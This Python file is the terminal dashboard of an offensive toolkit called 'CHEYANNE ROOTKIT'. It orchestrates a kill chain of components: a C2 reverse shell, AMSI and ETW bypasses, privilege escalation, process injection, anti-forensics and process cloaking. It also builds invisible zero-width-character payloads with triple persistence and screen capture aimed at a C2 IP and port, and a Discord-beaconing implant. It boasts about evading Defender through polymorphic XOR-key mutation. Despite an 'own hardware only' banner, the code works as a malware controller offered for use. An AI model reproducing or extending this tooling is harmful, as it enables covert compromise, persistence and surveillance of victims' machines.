"""
CHEYANNE ROOTKIT — Terminal Dashboard
ANSI colors matched to rainfantry.github.io palette.
"""
import os
import sys
import glob
import subprocess

if sys.platform == "win32":
    os.system("")  # enable ANSI on Windows
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

ROOT = os.path.dirname(os.path.abspath(__file__))

# rainfantry.github.io palette → ANSI true color
GREEN  = "\033[38;2;0;255;65m"
GREEN2 = "\033[38;2;0;204;51m"
GREEN3 = "\033[38;2;0;153;34m"
AMBER  = "\033[38;2;255;176;0m"
RED    = "\033[38;2;255;68;68m"
BLUE   = "\033[38;2;68;136;255m"
PINK   = "\033[38;2;255;45;138m"
DIM    = "\033[38;2;85;85;85m"
MUTED  = "\033[38;2;136;136;136m"
TEXT   = "\033[38;2;204;204;204m"
WHITE  = "\033[38;2;255;255;255m"
BOLD   = "\033[1m"
RST    = "\033[0m"

CHEYANNE_LOGO = f"""
{GREEN}{BOLD}
  ██████╗██╗  ██╗███████╗██╗   ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗
 ██╔════╝██║  ██║██╔════╝╚██╗ ██╔╝██╔══██╗████╗  ██║████╗  ██║██╔════╝
 ██║     ███████║█████╗   ╚████╔╝ ███████║██╔██╗ ██║██╔██╗ ██║█████╗
 ██║     ██╔══██║██╔══╝    ╚██╔╝  ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝
 ╚██████╗██║  ██║███████╗   ██║   ██║  ██║██║ ╚████║██║ ╚████║███████╗
  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝{RST}
"""

HELMET = f"""{DIM}           .          .
        .  |\\        /|  .
           | \\______/ |
      .    |  ______  |    .
           | |{RED}  ..  {DIM}| |
           | |{RED}  ::  {DIM}| |
           | |{RED} /__\\ {DIM}| |
           |  \\{MUTED}____/{DIM}  |
            \\________/{RST}"""

KILL_CHAIN = [
    ("0", "C2 REVERSE SHELL",    "ALPHA",   "shell/vader_shell.exe",           RED),
    ("1", "AMSI BYPASS",         "DELTA",   "amsi/amsi_hwbp.exe",             GREEN),
    ("2", "ETW BYPASS",          "FOXTROT", "etw/etw_hwbp.exe",               GREEN),
    ("3", "PRIVILEGE ESCALATION","GOLF",    "sideload/svc_replace.exe",        AMBER),
    ("4", "PROCESS INJECTION",   "HOTEL",   "injection/vader_inject.exe",      BLUE),
    ("5", "HTTP STAGER",         "INDIA",   "stagers/vader_stager.exe",        PINK),
    ("6", "ANTI-FORENSICS",      "JULIET",  "forensics/vader_clean.exe",       PINK),
    ("7", "CLOAK",               "KILO",    "cloak/bin/cloak.dll",             WHITE),
    ("M", "AUTO-MUTATION",       "MUTATE",  "mutate.py",                       AMBER),
]

GHOST_DIR = os.path.join(os.path.dirname(ROOT), "ghost-encoder")
CYAN   = "\033[38;2;0;229;255m"

TOOLS = [
    ("D", "DARK ROOM",   "Combined AMSI+ETW blind",         "dark_room/dark_room.exe"),
    ("I", "INJECTOR DLL","HWBP propagation payload",         "injection/vader_inject.dll"),
    ("C", "CLOAK LOADER","System-wide concealment",          "cloak/bin/cloak_loader.exe"),
    ("V", "DROPPER",     "Single-click full kill chain",     "cloak/bin/vader_dropper.exe"),
    ("G", "GHOST ENCODE","Steganographic payload encoder",   os.path.join(GHOST_DIR, "ghost_encode.py")),
    ("R", "RECON",       "Defender scanner",                 "recon/vader_recon.ps1"),
    ("P", "DEPLOY",      "Build + scan + deploy",            "deploy.py"),
]


def check_built(rel_path):
    return os.path.exists(os.path.join(ROOT, rel_path))


def get_xor_key(source_path, key_name="XOR_KEY"):
    import re
    path = os.path.join(ROOT, source_path)
    if not os.path.exists(path):
        return None
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            m = re.match(rf'\s*#define\s+{re.escape(key_name)}\s+(0x[0-9A-Fa-f]{{1,2}})', line)
            if m:
                return m.group(1)
    return None


def get_defender_version():
    for p in sorted(glob.glob(r"C:\ProgramData\Microsoft\Windows Defender\Platform\*"), reverse=True):
        return os.path.basename(p)
    return "unknown"


def hline(char="─", width=62, color=DIM):
    return f"  {color}{char * width}{RST}"


def render():
    os.system("cls" if sys.platform == "win32" else "clear")

    print(CHEYANNE_LOGO)
    print(f"  {DIM}{'─' * 62}{RST}")
    print(f"  {MUTED}22DIV{DIM} // {TEXT}george wu{DIM} // {GREEN2}rainfantry.github.io{RST}")
    print(f"  {DIM}Offensive Security Research Platform{RST}")
    print(f"  {DIM}{'─' * 62}{RST}")

    # helmet + info side by side
    helmet_lines = HELMET.strip().split("\n")
    info_lines = [
        f"{AMBER}CALLSIGN{DIM}:{RST}  CHEYANNE",
        f"{AMBER}TARGET{DIM}:{RST}    Own hardware only",
        f"{AMBER}DEFENDER{DIM}:{RST}  {get_defender_version()}",
        f"{AMBER}STATUS{DIM}:{RST}    {GREEN}OPERATIONAL{RST}",
        f"{AMBER}MSRC{DIM}:{RST}      VULN-195458",
        f"{AMBER}FINDING{DIM}:{RST}   {RED}HWBP Blind Spot{RST}",
        f"{AMBER}VERDICT{DIM}:{RST}   {RED}Won't Fix{RST}",
        "",
        f"  {DIM}\"The hunt never ends.\"{RST}",
    ]

    max_lines = max(len(helmet_lines), len(info_lines))
    print()
    for i in range(max_lines):
        left = helmet_lines[i] if i < len(helmet_lines) else ""
        right = info_lines[i] if i < len(info_lines) else ""
        # pad left column (strip ANSI for width calc)
        import re
        visible = re.sub(r'\033\[[0-9;]*m', '', left)
        pad = 36 - len(visible)
        print(f"  {left}{' ' * max(pad, 1)}{right}")

    # kill chain
    print()
    print(hline("═"))
    print(f"  {GREEN}{BOLD}  KILL CHAIN{RST}")
    print(hline("═"))
    print()
    print(f"  {DIM}  PH  {'COMPONENT':<24s} {'CODENAME':<10s} {'STATUS':<10s} {'KEY':<8s}{RST}")
    print(f"  {DIM}  {'─' * 58}{RST}")

    key_map = {
        "shell/vader_shell.exe":      ("shell/vader_shell_annotated.c", "XOR_KEY"),
        "amsi/amsi_hwbp.exe":         None,
        "etw/etw_hwbp.exe":           None,
        "sideload/svc_replace.exe":   None,
        "injection/vader_inject.exe": ("injection/vader_inject_annotated.c", "XOR_KEY"),
        "stagers/vader_stager.exe":   None,
        "forensics/vader_clean.exe":  None,
        "cloak/bin/cloak.dll":        None,
        "mutate.py":                  None,
    }

    for phase, name, codename, binary, color in KILL_CHAIN:
        built = check_built(binary)
        status = f"{GREEN}BUILT{RST}" if built else f"{RED}NOT BUILT{RST}"

        key_info = key_map.get(binary)
        if key_info:
            k = get_xor_key(key_info[0], key_info[1])
            key_str = f"{AMBER}{k}{RST}" if k else f"{DIM}---{RST}"
        else:
            key_str = f"{DIM}---{RST}"

        print(f"  {color}  [{phase}]  {name:<24s}{RST} {MUTED}{codename:<10s}{RST} {status:<20s} {key_str}")

    # tools
    print()
    print(hline("═"))
    print(f"  {BLUE}{BOLD}  ARSENAL{RST}")
    print(hline("═"))
    print()
    for key, name, desc, path in TOOLS:
        built = check_built(path)
        dot = f"{GREEN}●{RST}" if built else f"{RED}○{RST}"
        print(f"  {dot}  {BLUE}[{key}]{RST}  {WHITE}{name:<14s}{RST} {DIM}{desc:<30s}{RST}")

    # quick actions
    print()
    print(hline("═"))
    print(f"  {AMBER}{BOLD}  OPERATIONS{RST}")
    print(hline("═"))
    print()
    ops = [
        ("1", "Compile All",         "Build every component",           AMBER),
        ("2", "Scan All",            "Defender scan all binaries",      RED),
        ("3", "Dark Room Test",      "Runtime AMSI+ETW bypass verify",  GREEN),
        ("4", "Mutate All",          "Rotate XOR keys + recompile",     PINK),
        ("F", "FRESH BUILD",         "Auto-mutate + auto-IP + compile",  PINK),
        ("5", "Pentest",             "Full automated pentest chain",     RED),
        ("6", "Key Status",          "Show current XOR keys",           AMBER),
        ("7", "Build Cloak",         "Compile cloak.dll + loader",      WHITE),
        ("8", "Test Cloak",          "Verify process hiding works",     WHITE),
        ("9", "Activate Cloak",      "System-wide concealment ON",      RED),
        ("G", "Ghost Payload",       "Generate steganographic chain",   CYAN),
        ("W", "Web Dashboard",       "Launch browser C2 UI",            BLUE),
        ("A", "Agent (local)",       "Run agent connecting to localhost",GREEN),
        ("D", "C2 SHELL",            "TCP shell + Discord beacon",       GREEN),
        ("B", "Build Implant",      "Sync token → rebuild → serve",    CYAN),
        ("0", "Exit",                "",                                DIM),
    ]
    for key, name, desc, color in ops:
        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<20s}{RST} {DIM}{desc}{RST}")

    print()
    print(hline())
    cloak_ready = check_built("cloak/bin/cloak.dll") and check_built("cloak/bin/cloak_loader.exe")
    cloak_str = f"{WHITE}READY{DIM}" if cloak_ready else f"{RED}NOT BUILT{DIM}"
    ghost_ready = os.path.exists(os.path.join(GHOST_DIR, "ghost_encode.py"))
    ghost_str = f"{CYAN}LINKED{DIM}" if ghost_ready else f"{RED}NOT FOUND{DIM}"
    print(f"  {DIM}  Defender: {GREEN}ZERO{DIM} │ Cloak: {cloak_str} │ Ghost: {ghost_str}{RST}")
    print(hline())
    print()


def show_ghost_demo(ghost_file):
    """Show the ??????? visualization of a ghost file."""
    try:
        with open(ghost_file, 'r', encoding='utf-8') as f:
            content = f.read()
        start = content.index("@'") + 2
        end = content.index("'@")
        payload = content[start:end].strip()
        vis = payload.replace(payload[0] if payload else '', '?')
        lines = [vis[i:i+72] for i in range(0, min(len(vis), 360), 72)]
        print(f"\n  {CYAN}{'═' * 62}{RST}")
        print(f"  {CYAN}{BOLD}  GHOST PAYLOAD VISUALIZATION{RST}")
        print(f"  {CYAN}{'═' * 62}{RST}")
        print(f"  {DIM}  PS> cat {os.path.basename(ghost_file)}{RST}")
        print()
        for line in lines:
            print(f"  {AMBER}  {'?' * min(len(line), 72)}{RST}")
        if len(vis) > 360:
            print(f"  {DIM}  ... {len(payload):,} invisible characters total ...{RST}")
        print()
        print(f"  {DIM}  Invisible chars: {len(payload):,}{RST}")
        print(f"  {DIM}  File size:       {os.path.getsize(ghost_file):,} bytes{RST}")
        print(f"  {GREEN}  Defender:        CLEAN{RST}")
        print(f"  {CYAN}{'═' * 62}{RST}")
    except Exception as e:
        print(f"  {RED}[!] Cannot visualize: {e}{RST}")


def run_ghost():
    """Ghost encoding menu."""
    ghost_script = os.path.join(GHOST_DIR, "ghost_encode.py")
    if not os.path.exists(ghost_script):
        print(f"\n  {RED}[!] Ghost encoder not found at: {GHOST_DIR}{RST}")
        print(f"  {DIM}    Clone: gh repo clone rainfantry/ghost-encoder{RST}")
        return

    print(f"\n  {CYAN}{'═' * 62}{RST}")
    print(f"  {CYAN}{BOLD}  GHOST ENCODER — Steganographic Payload Delivery{RST}")
    print(f"  {CYAN}{'═' * 62}{RST}")
    print()
    print(f"  {DIM}  Encodes payloads into 16 zero-width Unicode characters.{RST}")
    print(f"  {DIM}  Output file appears BLANK. PowerShell cat shows ???????.{RST}")
    print(f"  {DIM}  0 detections on VirusTotal. 0 detections on Defender.{RST}")
    print()
    print(f"  {CYAN}  [1]{RST} {WHITE}CHEYANNE Chain{RST}   {DIM}Persist(3x) + shell + screen capture{RST}")
    print(f"  {CYAN}  [2]{RST} {WHITE}Reverse Shell{RST}    {DIM}Shell only (lightweight){RST}")
    print(f"  {CYAN}  [3]{RST} {WHITE}Test Payload{RST}     {DIM}Harmless proof-of-concept{RST}")
    print(f"  {CYAN}  [4]{RST} {WHITE}Custom File{RST}      {DIM}Encode any .ps1 script{RST}")
    print(f"  {CYAN}  [5]{RST} {WHITE}Verify{RST}           {DIM}Decode + verify a ghost file{RST}")
    print(f"  {CYAN}  [0]{RST} {DIM}Back{RST}")
    print()

    choice = input(f"  {CYAN}GHOST >{RST} ").strip()

    if choice == "1":
        ip = input(f"  {AMBER}C2 IP [{TEXT}192.168.1.96{AMBER}]:{RST} ").strip() or "192.168.1.96"
        port = input(f"  {AMBER}C2 PORT [{TEXT}4443{AMBER}]:{RST} ").strip() or "4443"
        out = os.path.join(ROOT, "ghost_cheyanne.ps1")
        print(f"\n  {CYAN}[*] Generating CHEYANNE chain ghost payload...{RST}")
        env = os.environ.copy()
        env["PYTHONIOENCODING"] = "utf-8"
        subprocess.run([sys.executable, ghost_script, "--vader", ip, port,
                        "-o", out, "--deliver", "bat",
                        "--dark-room", os.path.join(ROOT, "dark_room", "dark_room.exe")],
                       cwd=GHOST_DIR, env=env)
        if os.path.exists(out):
            show_ghost_demo(out)
            print(f"\n  {GREEN}[+] Kill chain:{RST}")
            print(f"  {DIM}  1. dark_room.exe  → AMSI/ETW blind{RST}")
            print(f"  {DIM}  2. ghost_cheyanne.ps1 → invisible decode + execute{RST}")
            print(f"  {DIM}  3. Persistence × 3 (HKCU + Startup + Task){RST}")
            print(f"  {DIM}  4. Auto-reconnect shell → {ip}:{port}{RST}")
            print(f"  {DIM}  5. Screen capture via 'screen' command{RST}")

    elif choice == "2":
        ip = input(f"  {AMBER}C2 IP [{TEXT}192.168.1.96{AMBER}]:{RST} ").strip() or "192.168.1.96"
        port = input(f"  {AMBER}C2 PORT [{TEXT}4443{AMBER}]:{RST} ").strip() or "4443"
        out = os.path.join(ROOT, "ghost_shell.ps1")
        env = os.environ.copy()
        env["PYTHONIOENCODING"] = "utf-8"
        subprocess.run([sys.executable, ghost_script, "--shell", ip, port, "-o", out],
                       cwd=GHOST_DIR, env=env)
        if os.path.exists(out):
            show_ghost_demo(out)

    elif choice == "3":
        out = os.path.join(ROOT, "ghost_test.ps1")
        env = os.environ.copy()
        env["PYTHONIOENCODING"] = "utf-8"
        subprocess.run([sys.executable, ghost_script, "--test", "-o", out],
                       cwd=GHOST_DIR, env=env)
        if os.path.exists(out):
            show_ghost_demo(out)
            run_it = input(f"\n  {AMBER}Execute test payload? [y/N]:{RST} ").strip().lower()
            if run_it == 'y':
                subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                                "-File", out])

    elif choice == "4":
        path = input(f"  {AMBER}Path to .ps1:{RST} ").strip()
        if os.path.exists(path):
            out = os.path.join(ROOT, "ghost_custom.ps1")
            env = os.environ.copy()
            env["PYTHONIOENCODING"] = "utf-8"
            subprocess.run([sys.executable, ghost_script, path, "-o", out],
                           cwd=GHOST_DIR, env=env)
            if os.path.exists(out):
                show_ghost_demo(out)
        else:
            print(f"  {RED}[!] File not found: {path}{RST}")

    elif choice == "5":
        path = input(f"  {AMBER}Ghost .ps1 to verify:{RST} ").strip()
        if os.path.exists(path):
            env = os.environ.copy()
            env["PYTHONIOENCODING"] = "utf-8"
            subprocess.run([sys.executable, ghost_script, "--verify", path],
                           cwd=GHOST_DIR, env=env)
        else:
            print(f"  {RED}[!] File not found: {path}{RST}")


def detect_lan_ip():
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None


def fresh_build(mutate, deploy):
    print(f"\n  {PINK}{BOLD}═══ FRESH BUILD — Auto-Mutate + Auto-IP ═══{RST}\n")

    # Step 1: detect operator IP
    my_ip = detect_lan_ip()
    if my_ip:
        print(f"  {GREEN}[+] Operator IP: {my_ip}{RST}")
    else:
        print(f"  {RED}[!] Could not detect LAN IP{RST}")
        my_ip = input(f"  {AMBER}Enter C2 IP: {RST}").strip()

    # Step 2: auto-mutate all components (rotate XOR keys + recompile)
    print(f"\n  {PINK}[*] PHASE 1: Mutating all components...{RST}\n")
    subprocess.run([sys.executable, mutate], cwd=ROOT)

    # Step 3: recompile shell with detected IP
    print(f"\n  {PINK}[*] PHASE 2: Building shell with C2={my_ip}:4443{RST}\n")
    subprocess.run([sys.executable, deploy, "--compile-shell", my_ip, "4443"], cwd=ROOT)

    # Step 4: scan
    print(f"\n  {PINK}[*] PHASE 3: Scanning all binaries...{RST}\n")
    subprocess.run([sys.executable, deploy, "--status"], cwd=ROOT)

    print(f"\n  {GREEN}{BOLD}═══ FRESH BUILD COMPLETE ═══{RST}")
    print(f"  {WHITE}Every binary is unique. Every hash is new.{RST}")
    print(f"  {WHITE}Shell targets: {my_ip}:4443{RST}")
    print(f"  {DIM}Defender signatures are worthless against polymorphic builds.{RST}\n")


def run_op(choice):
    deploy = os.path.join(ROOT, "deploy.py")
    mutate = os.path.join(ROOT, "mutate.py")

    cloak_build = os.path.join(ROOT, "cloak", "build_cloak.py")
    cloak_test  = os.path.join(ROOT, "cloak", "bin", "test_hook.exe")
    cloak_loader = os.path.join(ROOT, "cloak", "bin", "cloak_loader.exe")

    if choice == "1":
        subprocess.run([sys.executable, deploy, "--compile"], cwd=ROOT)
    elif choice == "2":
        subprocess.run([sys.executable, deploy, "--status"], cwd=ROOT)
    elif choice == "3":
        dark = os.path.join(ROOT, "dark_room", "dark_room.exe")
        if os.path.exists(dark):
            subprocess.run([dark, "--test"])
        else:
            print(f"\n  {RED}[!] dark_room.exe not built. Run compile first.{RST}")
    elif choice == "4":
        subprocess.run([sys.executable, mutate], cwd=ROOT)
    elif choice.lower() == "f":
        fresh_build(mutate, deploy)
    elif choice == "5":
        subprocess.run([sys.executable, deploy, "--pentest"], cwd=ROOT)
    elif choice == "6":
        subprocess.run([sys.executable, mutate, "--status"], cwd=ROOT)
    elif choice == "7":
        subprocess.run([sys.executable, cloak_build, "--scan"], cwd=ROOT)
    elif choice == "8":
        if os.path.exists(cloak_test):
            subprocess.run([cloak_test], cwd=os.path.join(ROOT, "cloak", "bin"))
        else:
            print(f"\n  {RED}[!] test_hook.exe not built. Build cloak first (option 7).{RST}")
    elif choice == "9":
        if os.path.exists(cloak_loader):
            print(f"\n  {WHITE}[*] Activating system-wide concealment...{RST}")
            print(f"  {DIM}    Press ENTER in the loader window to deactivate.{RST}\n")
            subprocess.run([cloak_loader], cwd=os.path.join(ROOT, "cloak", "bin"))
        else:
            print(f"\n  {RED}[!] cloak_loader.exe not built. Build cloak first (option 7).{RST}")
    elif choice.lower() == "g":
        run_ghost()
    elif choice.lower() == "w":
        ui_script = os.path.join(ROOT, "vader_ui.py")
        print(f"\n  {BLUE}[*] Launching web dashboard on http://0.0.0.0:8666{RST}")
        subprocess.Popen([sys.executable, ui_script], cwd=ROOT)
        import webbrowser
        import time
        time.sleep(1)
        webbrowser.open("http://127.0.0.1:8666")
    elif choice.lower() == "a":
        agent_script = os.path.join(ROOT, "vader_agent.py")
        print(f"\n  {GREEN}[*] Launching local agent → 127.0.0.1:8667{RST}")
        subprocess.run([sys.executable, agent_script, "127.0.0.1", "--reconnect"], cwd=ROOT)
    elif choice.lower() == "d":
        c2_v2 = os.path.join(ROOT, "shell", "vader_c2_v2.py")
        print(f"\n  {GREEN}[*] Launching CHEYANNE C2 — Dual Channel (TCP + Discord){RST}")
        subprocess.run([sys.executable, c2_v2], cwd=ROOT)
    elif choice.lower() == "b":
        print(f"\n  {CYAN}[*] Discord Implant — Full Deploy Pipeline{RST}")
        subprocess.run([sys.executable, os.path.join(ROOT, "deploy.py"), "--implant-deploy"])
    else:
        return False

    input(f"\n  {DIM}Press Enter to continue...{RST}")
    return True


def main():
    while True:
        render()
        choice = input(f"  {GREEN}CHEYANNE >{RST} ").strip()
        if choice == "0" or choice.lower() in ("q", "quit", "exit"):
            print(f"\n  {DIM}The hunt never ends.{RST}\n")
            break
        if not run_op(choice.strip("﻿")):
            if choice.strip("﻿"):
                print(f"\n  {RED}[!] Unknown command: {choice}{RST}")
                input(f"  {DIM}Press Enter...{RST}")


if __name__ == "__main__":
    main()
